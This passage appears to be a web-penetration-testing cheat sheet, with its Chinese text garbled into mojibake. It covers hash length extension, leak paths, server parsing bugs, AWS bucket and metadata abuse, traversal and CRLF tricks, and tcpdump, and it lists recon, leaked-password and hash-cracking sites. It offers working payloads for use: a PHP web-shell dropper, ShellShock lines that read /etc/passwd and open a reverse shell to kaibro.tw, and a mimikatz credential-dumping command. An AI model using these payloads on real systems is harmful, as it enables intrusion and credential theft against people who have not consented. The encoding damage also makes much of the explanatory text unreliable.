- ç¬¦åˆä¸‰ä¸ªæ¡ä»¶å°±èƒ½æ„é€ `md5(secret+message+padding+ä»»æ„å­—ç¬¦ä¸²)`
- å·¥å…· - hashpump
    - åŸºæœ¬ç”¨æ³•ï¼š
        1. è¾“å…¥`md5(secret+message)`çš„å€¼
        2. è¾“å…¥`message`çš„å€¼
        3. è¾“å…¥`secerté•¿åº¦`
        4. è¾“å…¥è¦åŠ åœ¨åé¢çš„å­—ç¬¦ä¸²
        5. æœ€åä¼šæŠŠ`md5(secret+message+padding+ä»»æ„å­—ç¬¦ä¸²)`å’Œ`message+padding+ä»»æ„å­—ç¬¦ä¸²`å–·ç»™ä½ 


# å…¶å®ƒ

 - Information leak
     - .git / .svn
     - robots.txt
     - /.well-known
     - .DS_Store
     - .htaccess
     - .pyc
     - server-status
     - crossdomain.xml
     - admin/ manager/ login/ backup/ wp-login/ phpMyAdmin/
     - xxx.php.bak / www.tar.gz / xxx.php.swp / xxx.php~ / xxx.phps
     - /WEB-INF/web.xml
 - æ–‡ä»¶è§£ææ¼æ´
     - Apache
         - shell.php.ggininder
     - IIS
         - IIS < 7
             - a.asp/user.jpg
             - user.asp;aa.jpg
     - Nginx
         - nginx < 8.03
             - `cgi.fix_pathinfo=1`
             - Fast-CGIå¼€å¯çŠ¶å†µä¸‹
             - kaibro.jpg: `<?php fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>`
             - è®¿é—®`kaibro.jpg/.php`ç”Ÿæˆshell.php

- AWSå¸¸è§æ¼æ´
    - S3 bucketæƒé™é…ç½®é”™è¯¯
        - nslookupåˆ¤æ–­
            - `nslookup 87.87.87.87`
            - `s3-website-us-west-2.amazonaws.com.`
        - ç¡®è®¤bucket
            - è®¿é—®`bucketname.s3.amazonaws.com`
            - æˆåŠŸä¼šè¿”å›bucket XMLä¿¡æ¯
        - awscliå·¥å…·
            - åˆ—ç›®å½• `aws s3 ls s3://bucketname/ --region regionname`
            - ä¸‹è½½ `aws sync s3://bucketname/ localdir --region regionname`
    - metadata
        - http://169.254.169.254/latest/meta-data/
        - Tool 
            - https://andresriancho.github.io/nimbostratus/

- å¸¸è§PortæœåŠ¡
    - http://packetlife.net/media/library/23/common_ports.pdf
- `php -i | grep "Loaded Configuration File"`
    
    - åˆ—å‡ºphp.iniè·¯å¾„

- `curl -i -X OPTIONS 'http://evil.com/'`

- ShellShock
    
    - `() { :; }; echo vulnerable`
    - `() { :a; }; /bin/cat /etc/passwd`
    - `() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'`

- X-forwarded-forä¼ªé€ æ¥æºIP

- DNS Zone Transfer
    - `dig @1.2.3.4 abc.com axfr`
        - DNS Server: `1.2.3.4`
        - Test Domain: `abc.com`

- NodeJS unicode failure
    - å†…éƒ¨ä½¿ç”¨UCS-2ç¼–ç 
    - `ï¼®ï¼®` => `..`
        - `ï¼®` å³ `\xff\x2e`
        - è½¬å‹æ—¶èˆå¼ƒç¬¬ä¸€ä¸ªByte

- ç‰¹æ®Šçš„CRLF Injectionç»•è¿‡
    - `%E5%98%8A`
    - åŸå§‹çš„Unicodeç ä¸º`U+560A`
    - raw bytes: `0x56`, `0x0A`

- MySQL utf8 v.s. utf8mb4
    - MySQL utf8ç¼–ç åªæ”¯æŒ3 bytes
    - è‹¥å°†4 bytesçš„utf8mb4æ’å…¥utf8ä¸­ï¼Œåœ¨non strictæ¨¡å¼ä¸‹ä¼šè¢«æˆªæ–­
    - CVE-2015-3438 WordPress Cross-Site Scripting Vulnerability

- Nginxç›®å½•ç©¿è¶Šæ¼æ´
    - å¸¸è§äºNginxåšReverse Proxyçš„çŠ¶å†µ
    ```
    location /files {
        alias /home/
    }
    ```
    - å› ä¸º`/files`æ²¡æœ‰åŠ ä¸Šç»“å°¾`/`ï¼Œè€Œ`/home/`æœ‰
    - æ‰€ä»¥`/files../`å¯ä»¥è®¿é—®ä¸Šå±‚ç›®å½•

- Node.jsç›®å½•ç©¿è¶Šæ¼æ´
    - CVE-2017-14849
    - å½±å“: 8.5.0ç‰ˆ
    - `/static/../../../foo/../../../../etc/passwd`

- Apache Tomcat Sessionæ“çºµæ¼æ´
    - é¢„è®¾sessionèŒƒä¾‹é¡µé¢`/examples/servlets /servlet/SessionExample`
    - å¯ä»¥ç›´æ¥å¯¹Sessionå†™å…¥

- tcpdump
    - `-i` æŒ‡å®šç½‘å¡ï¼Œä¸æŒ‡å®šåˆ™ç›‘æ§æ‰€æœ‰ç½‘å¡
    - `-s` é»˜è®¤åªæŠ“96bytesï¼Œå¯ä»¥-sæŒ‡å®šæ›´å¤§æ•°å€¼
    - `-w` æŒ‡å®šè¾“å‡ºæ¡£
    - `host` æŒ‡å®šä¸»æœº(ip or domain)
    - `dst`, `src` æ¥æºæˆ–ç›®çš„ç«¯
    - `port`æŒ‡å®šç«¯å£
    - `tcp`, `udp`, `icmp` æŒ‡å®šåè®®
    - example
        - æ¥æº192.168.1.34ä¸”ç›®çš„ç«¯å£ä¸º80
            - `tcpdump -i eth0 src 192.168.1.34 and dst port 80`
        - æ¥æº192.168.1.34ä¸”ç›®çš„ç«¯å£æ˜¯22æˆ–3389
            - `tcpdump -i eth0 'src 192.168.1.34 and (dst port 22 or 3389)'`
        - ä¿å­˜æ¡£æ¡ˆï¼Œå¯ä»¥åç»­ç”¨wiresharkåˆ†æ
            - `tcpdump -i eth0 src kaibro.tw -w file.cap`



# Tool & Online Website

## Information gathering

- http://pentest-tools.com/

- https://www.shodan.io/

- https://www.zoomeye.org/

- https://censys.io

- https://crt.sh/

- http://webscan.cc/

- https://x.threatbook.cn/

- https://dnsdumpster.com/

- https://www.domainiq.com/reverse_whois

- https://www.yougetsignal.com/tools/web-sites-on-web-server/

- https://www.robtex.com/dns-lookup/

- https://phpinfo.me/bing.php

- https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project

- https://github.com/laramies/theHarvester

- https://github.com/drwetter/testssl.sh

- https://github.com/urbanadventurer/WhatWeb

- https://buckets.grayhatwarfare.com/

## Social Engineering

- https://leakedsource.ru/

- https://www.shuju666.com/

- http://www.pwsay.com/

- http://www.mimayun.club/

- http://leakbase.pw

- https://haveibeenpwned.com/

## Crack

- http://cmd5.com

- https://somd5.com/

- https://crackstation.net/

- https://hashkiller.co.uk/

## å…¶å®ƒ

- https://3v4l.org/
    - php eval

- https://github.com/denny0223/scrabble
    - git

- https://github.com/lijiejie/ds_store_exp
    - .DS_Store 

- https://github.com/kost/dvcs-ripper
    - git / svn / hg / cvs ...

- http://www.factordb.com/

- unicode converter
    - https://www.branah.com/unicode-converter

- PHPæ··æ·† / åŠ å¯†
    - http://enphp.djunny.com/
    - http://www.phpjm.net/

- https://github.com/PowerShellMafia/PowerSploit

- https://github.com/swisskyrepo/PayloadsAllTheThings/

- http://xssor.io

- https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt
    - XSS Payloads

- DNSLog
    - http://ceye.io
    - https://www.t00ls.net/dnslog.html
    - http://dnsbin.zhack.ca/

- https://r12a.github.io/apps/encodings/
    - Encoding converter 

- Mimikatz
    - `mimikatz.exe privilege::debug sekurlsa::logonpasswords full exit >> log.txt`
